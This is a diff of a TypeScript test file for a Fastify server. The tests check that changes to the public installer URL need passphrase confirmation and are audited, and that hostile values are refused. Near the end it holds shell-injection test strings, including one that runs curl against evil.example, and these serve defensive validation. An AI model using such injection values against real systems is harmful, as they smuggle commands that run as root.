@@ -6,16 +6,18 @@ import { afterEach, describe, expect, test } from 'vitest';
 import { createApp } from '../app.js';
 import { listAudit } from '../auth/audit.js';
 import { Backoff } from '../auth/backoff.js';
-import { SetupMode } from '../auth/operator.js';
+import { SetupMode, setOperatorPassphrase } from '../auth/operator.js';
 import { loadBoot } from '../config/boot.js';
 import { ConfigStore } from '../config/store.js';
+import { fileModeServer, parseEditable } from '../config.js';
 import { openDb } from '../db/open.js';
-import type { TailscaleDeps } from '../reach.js';
+import { PLAIN_ORIGIN, type TailscaleDeps } from '../reach.js';
 import { operatorSession, t0, tmpDbFile } from '../test/helpers.js';
 
 const TOKEN = 'o'.repeat(32);
 const HOST = '127.0.0.1:7420';
 const URL_PATH = '/api/control/server/public-url';
+const PASS = 'a long operator passphrase';
 
 let app: FastifyInstance | undefined;
 afterEach(async () => {
@@ -131,27 +133,118 @@ describe('saving server.publicUrl', () => {
     });
   });
 
-  test('with a session and its CSRF header it is applied; null clears it', async () => {
+  // Issue #254 (D1): the address decides which script a new machine runs as root, so a session
+  // without the passphrase cannot set, change or clear it; the guarded confirmation can.
+  test('from a session it is held for the confirmation page, for a set, a change and a clear', async () => {
     const w = world();
-    const set = await w.inject({
+    const say = 'New machines will download and run the installer from this address as root';
+    const put = (publicUrl: string | null) =>
+      w.inject({ method: 'PUT', url: URL_PATH, headers: w.session, payload: { publicUrl } });
+
+    const set = await put('https://a.b.ts.net');
+    expect(set.statusCode, set.body).toBe(409);
+    expect(set.json()).toMatchObject({
+      needsConfirmation: true,
+      guarded: [{ path: 'server.publicUrl', consequence: `${say}: https://a.b.ts.net` }],
+    });
+    expect(set.json().confirm).toMatch(/^\/config\/confirm\//);
+    expect(w.store.current().server).toBeUndefined();
+
+    await w.inject({
       method: 'PUT',
       url: URL_PATH,
-      headers: w.session,
+      headers: w.bearer,
       payload: { publicUrl: 'https://a.b.ts.net' },
     });
-    expect(set.statusCode, set.body).toBe(200);
-    const clear = await w.inject({
+    const rev = w.store.revision();
+    for (const value of ['https://evil.example', null]) {
+      const r = await put(value);
+      expect(r.statusCode, r.body).toBe(409);
+      expect(r.json().needsConfirmation).toBe(true);
+      expect(w.store.current().server?.publicUrl).toBe('https://a.b.ts.net');
+      expect(w.store.revision()).toBe(rev);
+    }
+    // Only proposals are audited from the session; the one applied change is the token's.
+    expect(
+      listAudit(w.db)
+        .reverse()
+        .map((a) => [a.action, a.via]),
+    ).toEqual([
+      ['config.propose', 'session'],
+      ['server.public_url', 'token'],
+      ['config.propose', 'session'],
+      ['config.propose', 'session'],
+    ]);
+  });
+
+  test('confirmed with the passphrase it is applied, audited as server.public_url in the same shape', async () => {
+    const w = world();
+    await setOperatorPassphrase(w.db, PASS, t0);
+    // Setting the passphrase ends every session: this one starts after it.
+    const s = operatorSession(w.db, t0);
+    const session = { host: HOST, cookie: s.cookie, 'x-jm-csrf': s.csrf };
+    const browser = { host: HOST, cookie: s.cookie };
+    // The token's row, the shape the confirmed one must keep.
+    await w.inject({
       method: 'PUT',
       url: URL_PATH,
-      headers: w.session,
-      payload: { publicUrl: null },
+      headers: w.bearer,
+      payload: { publicUrl: 'https://a.b.ts.net' },
     });
-    expect(clear.statusCode, clear.body).toBe(200);
-    expect(w.store.current().server?.publicUrl).toBeUndefined();
-    expect(listAudit(w.db).map((a) => [a.action, a.via])).toEqual([
-      ['server.public_url', 'session'],
-      ['server.public_url', 'session'],
+    const held = await w.inject({
+      method: 'PUT',
+      url: URL_PATH,
+      headers: session,
+      payload: { publicUrl: 'https://c.d.ts.net' },
+    });
+    expect(held.statusCode, held.body).toBe(409);
+    const page = await w.inject({
+      method: 'GET',
+      url: held.json().confirm,
+      headers: browser,
+    });
+    expect(page.statusCode).toBe(200);
+    expect(page.body).toContain(
+      'New machines will download and run the installer from this address as root',
+    );
+    const token = /name="token" value="([\w-]+)"/.exec(page.body)?.[1] as string;
+    const done = await w.inject({
+      method: 'POST',
+      url: held.json().confirm,
+      headers: {
+        ...browser,
+        origin: `http://${HOST}`,
+        'content-type': 'application/x-www-form-urlencoded',
+      },
+      payload: new URLSearchParams({ token, passphrase: PASS }).toString(),
+    });
+    expect(done.statusCode, done.body).toBe(303);
+    expect(done.headers.location).toBe('/settings/other-machines');
+    expect(w.store.current().server?.publicUrl).toBe('https://c.d.ts.net');
+    const rows = listAudit(w.db)
+      .reverse()
+      .filter((a) => a.action === 'server.public_url');
+    expect(rows.map((a) => [a.via, a.detail.publicUrl])).toEqual([
+      ['token', 'https://a.b.ts.net'],
+      ['session', 'https://c.d.ts.net'],
     ]);
+    expect(Object.keys(rows[1]?.detail ?? {}).sort()).toEqual(
+      Object.keys(rows[0]?.detail ?? {}).sort(),
+    );
+  });
+
+  test('a token clear is applied at once', async () => {
+    const w = world();
+    for (const publicUrl of ['https://a.b.ts.net', null]) {
+      const r = await w.inject({
+        method: 'PUT',
+        url: URL_PATH,
+        headers: w.bearer,
+        payload: { publicUrl },
+      });
+      expect(r.statusCode, r.body).toBe(200);
+    }
+    expect(w.store.current().server?.publicUrl).toBeUndefined();
   });
 
   test('an invalid address is refused with its rule, not stored, not audited', async () => {
@@ -175,6 +268,36 @@ describe('saving server.publicUrl', () => {
     expect(w.store.current().server).toBeUndefined();
     expect(listAudit(w.db)).toEqual([]);
   });
+});
+
+// Issue #254 (D5): every path that accepts the address refuses the same hostile values.
+describe('a hostile address is refused by the config parse, the environment and the PUT', () => {
+  const noLock = { imageLockPath: join(tmpdir(), 'jm-no-such-lock.json'), strict: true };
+  test.each(['https://a.ts.net;reboot;', 'https://a.ts.net;{eval,"$({curl,-s,evil.example})"};x'])(
+    '%s',
+    async (hostile) => {
+      const parsed = parseEditable({ server: { publicUrl: hostile } }, noLock);
+      expect(parsed.ok).toBe(false);
+      if (!parsed.ok)
+        expect(parsed.issues).toEqual([{ path: 'server.publicUrl', message: PLAIN_ORIGIN }]);
+
+      expect(() => fileModeServer(undefined, { JM_PUBLIC_URL: hostile })).toThrow(
+        `JM_PUBLIC_URL: ${PLAIN_ORIGIN}`,
+      );
+
+      const w = world();
+      const r = await w.inject({
+        method: 'PUT',
+        url: URL_PATH,
+        headers: w.bearer,
+        payload: { publicUrl: hostile },
+      });
+      expect(r.statusCode).toBe(400);
+      expect(r.json().issues).toEqual([{ path: 'server.publicUrl', message: PLAIN_ORIGIN }]);
+      expect(w.store.current().server).toBeUndefined();
+      expect(listAudit(w.db)).toEqual([]);
+    },
+  );
 });
 
 describe('Check', () => {
